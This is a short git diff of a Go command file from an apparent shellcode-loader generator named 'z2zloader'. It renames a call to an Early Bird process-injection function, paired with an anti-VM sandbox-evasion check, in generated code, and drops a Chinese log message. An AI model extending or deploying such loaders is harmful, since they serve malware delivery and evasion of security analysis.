@@ -6,7 +6,6 @@ package cmd
 import (
 	"fmt"
 	"github.com/spf13/cobra"
-	"log"
 	"z2zloader/tools"
 )
 
@@ -43,12 +42,11 @@ var localCmd = &cobra.Command{
 			}
 		case "4":
 			if sandbox {
-				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.EaybirlInject(\"%v\")", fp))
+				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.EarlybirlInject(\"%v\")", fp))
 			} else {
-				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.EaybirlInject(\"%v\")", fp))
+				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.EarlybirlInject(\"%v\")", fp))
 			}
 		}
-		log.Println("文件创建完成,请到output目录下查看")
 	},
 }
 
